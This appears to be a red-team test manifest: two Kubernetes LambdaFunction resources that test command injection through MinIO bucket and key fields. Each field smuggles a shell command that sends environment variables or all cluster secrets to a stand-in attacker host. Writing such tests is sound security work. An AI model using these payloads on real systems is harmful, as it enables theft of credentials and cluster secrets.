# VULN-002: Command Injection via MinIO Bucket/Key
# ⚠️ AUTHORIZED TESTING ONLY
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-002-minio-bucket-injection
  labels:
    redteam: "true"
    exploit: "vuln-002"
    target: "minio-bucket"
  annotations:
    redteam.knative.io/description: "Command injection via MinIO bucket field"
spec:
  source:
    type: minio
    minio:
      endpoint: "minio.minio.svc:9000"
      # Injection in bucket field
      bucket: "lambda; env | curl -X POST -d @- http://attacker.example.com/env #"
      key: "code.zip"
      credentialsSecret: "minio-credentials"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-002-minio-key-injection
  labels:
    redteam: "true"
    exploit: "vuln-002"
    target: "minio-key"
  annotations:
    redteam.knative.io/description: "Command injection via MinIO key field"
spec:
  source:
    type: minio
    minio:
      endpoint: "minio.minio.svc:9000"
      bucket: "lambda-source"
      # Injection in key field
      key: "x; kubectl get secrets -A -o json | curl -X POST -d @- http://attacker.example.com/secrets #"
      credentialsSecret: "minio-credentials"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
